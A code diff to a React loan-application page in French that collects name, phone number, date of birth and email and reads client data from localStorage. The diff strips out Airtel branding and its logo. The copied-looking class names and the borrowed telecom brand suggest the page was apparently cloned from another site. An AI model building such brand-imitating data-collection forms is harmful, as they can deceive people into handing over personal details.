@@ -1,15 +1,8 @@
 import React, { useState, useEffect } from 'react'
 import { apiService } from '../services/api.js'
 
-const LogoPlaceholder = () => (
-  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="85" height="80">
-    <circle cx="50" cy="50" r="45" fill="#11bb4a"/>
-    <text x="50" y="58" font-size="48" font-weight="bold" fill="white" text-anchor="middle" font-family="Arial, sans-serif">A</text>
-  </svg>
-)
-
 function Apply() {
-  const [client, setClient] = useState({
+  const [client] = useState({
     name: "",
     number: "",
     dob: "",
@@ -31,7 +24,6 @@ function Apply() {
     email: ""
   })
 
-  const [imgError, setImgError] = useState(false)
   const [showSuccess, setShowSuccess] = useState(false)
   const [isSubmitting, setIsSubmitting] = useState(false)
 
@@ -39,8 +31,7 @@ function Apply() {
     const storedData = localStorage.getItem('clientData')
     if (storedData) {
       const parsed = JSON.parse(storedData)
-      setClient(prev => ({ ...prev, ...parsed }))
-      setFormData(parsed)
+      localStorage.setItem('clientData', JSON.stringify(parsed))
     }
   }, [])
 
@@ -109,16 +100,8 @@ function Apply() {
   return (
     <div className="container">
       <div className="topHeader">
-        <div className="logo">
-          {!imgError ? (
-            <img src="/assets/icon-C_cpc0tJ.jpeg" alt="Airtel Logo" 
-                 onError={() => setImgError(true)} />
-          ) : (
-            <LogoPlaceholder />
-          )}
-          <div>
-            <h1>Airtel</h1>
-          </div>
+        <div className="logo" style={{ marginBottom: '15px', textAlign: 'center' }}>
+          <img src="/assets/image.png" alt="Logo" style={{ height: '40px', width: 'auto', maxWidth: '100px' }} />
         </div>
       </div>
       <h1 className="login-title"> Application de prêt</h1>
@@ -127,12 +110,9 @@ function Apply() {
         <div className="_container_r2qkh_6">
           <div className="_containe_r2qkh_6">
             <section className="_header_r2qkh_21">
-              {!imgError ? (
-                <img src="/assets/icon-C_cpc0tJ.jpeg" alt="Logo" 
-                     onError={() => setImgError(true)} />
-              ) : (
-                <LogoPlaceholder />
-              )}
+              <div style={{ textAlign: 'center', marginBottom: '15px' }}>
+                <img src="/assets/image.png" alt="Logo" style={{ height: '40px', width: 'auto', maxWidth: '100px' }} />
+              </div>
               <h1>Félicitations !</h1>
             </section>
 
